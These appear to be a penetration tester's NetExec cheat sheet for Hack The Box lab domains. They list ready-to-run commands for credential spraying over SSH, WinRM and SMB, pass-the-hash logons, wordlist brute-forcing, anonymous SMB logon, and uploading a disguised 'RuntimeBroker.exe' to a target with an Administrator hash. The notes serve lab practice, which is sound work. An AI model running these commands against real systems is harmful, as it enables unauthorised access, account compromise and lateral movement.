# NetExec

### SSH

* attempt ssh authentication to multiple hosts with one set of credentials&#x20;

```
./nxc ssh targets.txt -u james -p password123
./nxc ssh targets.txt -u balthazar -p 'password123'
./nxc ssh targets.txt -u root -p asdfghjkl
```

* attempt ssh auth to any host in a subnet with one set of credentials&#x20;

```
./nxc ssh 172.16.1.0/24 -u james -p password123
```

### WINRM

* attempt winrm authentication to multiple hosts with one set of credentials&#x20;

```
./nxc winrm targets.txt -u balthazar -p 'abc123!!!'
# domain authentication
./nxc winrm targets.txt -u 'HTB.local\balthazar' -p 'abc123!!!' 
./nxc winrm targets.txt -u 'HTB.local\james' -p password123
```

* attempt winrm authentication to a domain with a username and hash

```
./nxc winrm targets.txt -d HTB.local -u blake -H 12f18eteb6f8187fa52f3f729896bbb7
./nxc winrm targets.txt -u Administrator -H b99ed3c3d34c4576bcd33c76420be934
```

* winrm with a single username and a password wordlist

```
./nxc winrm 172.16.1.101 -u dan.hard -p 172.16.1.101/passwordlist.txt 
```

### SMB

* attempt smb authentication to multiple hosts with one set of credentials&#x20;

```
./nxc smb targets.txt -u 'HTB.local\james' -p password123
```

* attempt ssh authentication with a keyfile instead of a password

```
./nxc ssh 172.16.1.0/24 -u root --key-file ./10.10.110.100/ssh/id_rsa -p ''
```

* attempt smb auth to any host in a subnet with anonymous logon&#x20;

```
./nxc smb 172.16.1.0/24 -u anonymous -p ''
```

* smb authentication to a domain with a specific username and attempt a password wordlist

```
./nxc smb 172.16.1.13 -d DANTE.local -u 'gerald' -p /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 
```

### Put file

```
./nxc smb 172.16.1.13 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:d0629f5539666892bf9ba9b34daa125c --put-file /opt/wmiexec2/RuntimeBroker.exe \\xampp\\apache\\bin\\iconv\\RuntimeBroker.exe
```
